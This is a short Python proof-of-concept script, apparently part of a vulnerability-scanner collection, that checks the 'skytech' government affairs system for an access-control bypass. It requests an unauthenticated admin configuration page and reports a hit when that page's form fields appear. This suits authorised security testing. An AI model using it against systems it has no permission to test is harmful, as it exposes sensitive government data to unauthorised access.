#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: skytech政务系统越权漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-081902
author: Lucifer
description: skytech政务系统越权漏洞,泄露敏感信息。
'''
import sys
import requests
import warnings
sys.path.append('../../') 
from color import *

class skytech_bypass_priv:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/admin/sysconfig_reg_page.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            if r"txtUserRights" in req.text and r"txtTitle" in req.text:
                printGreen("[+]Success:存在skytech政务系统越权漏洞...(敏感信息)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在skytech_bypass_priv漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = skytech_bypass_priv(sys.argv[1])
    testVuln.run()
